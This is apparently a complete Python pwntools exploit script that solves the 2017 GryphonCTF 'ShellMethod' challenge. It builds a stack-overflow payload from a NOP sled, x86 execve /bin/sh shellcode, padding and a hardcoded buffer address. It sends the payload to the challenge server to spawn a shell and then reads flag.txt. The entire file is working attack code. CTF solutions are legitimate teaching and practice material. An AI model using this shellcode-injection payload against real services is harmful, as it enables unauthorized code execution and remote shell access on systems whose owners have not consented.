#! /usr/bin/env python3
##
# Created for GryphonCTF 2017_ShellMethod
# By Amos (LFlare) Ng <amosng1@gmail.com>
##
# Imports
from pwn import *

# Prepare buf address, shellcode and payload
buf = p32(0x804b008) # Get buffer address from GDB
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" \
            b"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
payload = (b"\x90" * (64 - len(shellcode))) + shellcode + (b"\x41" * 4) + buf

# Logging
with log.progress("Cracking XOR...") as p:
    # Create tube
    t = remote("pwn2.chal.gryphonctf.com", 17344)

    # Send payload and dump initial output
    t.recvuntil("Your response? ")
    t.sendline(payload)

    # Cat flag.txt
    t.sendline("cat flag.txt")
    flag = t.recvline().decode()
    p.success(flag)
